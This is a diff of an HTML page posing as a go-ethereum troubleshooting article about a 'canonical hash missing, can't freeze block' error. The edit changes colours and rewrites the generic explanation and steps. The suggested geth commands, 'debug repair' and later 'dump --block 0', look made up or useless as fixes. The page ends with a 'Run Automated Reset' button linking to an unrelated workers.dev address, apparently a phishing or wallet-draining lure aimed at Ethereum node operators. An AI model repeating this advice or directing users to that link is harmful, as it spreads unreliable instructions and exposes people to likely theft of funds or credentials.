@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #0f111a;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message "Error in block freeze operation err="canonical hash missing, can't freeze block" while using Go Ethereum, indicating a failure in the block freeze operation due to a missing canonical hash.</li>
+<li>The user encounters a "go-ethereum Error in block freeze operation" error message, specifically stating "errcanonical hash missing, can't freeze block" when attempting to freeze a block in their Ethereum (ETH) ecosystem.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the canonical hash, which is essential for verifying the integrity and authenticity of a block, is missing. This hash is crucial for the freeze operation as it ensures that the block being frozen is part of the canonical chain, thereby preventing potential forks or inconsistencies in the blockchain.</li>
+<li>This error occurs due to a missing canonical hash, which is required for the block freeze operation to proceed. The canonical hash is a crucial component in verifying the integrity of the blockchain, and its absence prevents the node from successfully freezing the block.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, the following steps can be taken:</li>
-<li>Verify the blockchain data integrity by checking for any corruption or missing blocks.</li>
-<li>Ensure that the node is fully synchronized with the Ethereum network to have the most up-to-date blockchain data.</li>
-<li>Execute a command to manually update or repair the canonical hash, such as:</li>
+<li>To resolve this issue, the following steps can be taken:</li>
+<li>Verify the blockchain data integrity by checking for any corrupted or missing blocks.</li>
+<li>Restart the Ethereum node to ensure it resynchronizes with the network and potentially retrieves the missing canonical hash.</li>
+<li>Execute the following command to manually update the blockchain data:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>debug<span class="w"> </span>repair
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>dump<span class="w"> </span>--block<span class="w"> </span><span class="m">0</span>
 </code></pre></div>
 
-<p>Consider utilizing an external terminal for more complex command-line operations.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and diagnostics.</p>
 <h2>Prerequisites</h2>
 <ul>
 <li>A fully synchronized Ethereum node</li>
-<li>Access to the terminal or command-line interface</li>
-<li>Sufficient permissions to execute commands on the node's data directory</li>
+<li>The latest version of Go Ethereum (geth) installed</li>
+<li>A backup of the blockchain data to prevent data loss during troubleshooting</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
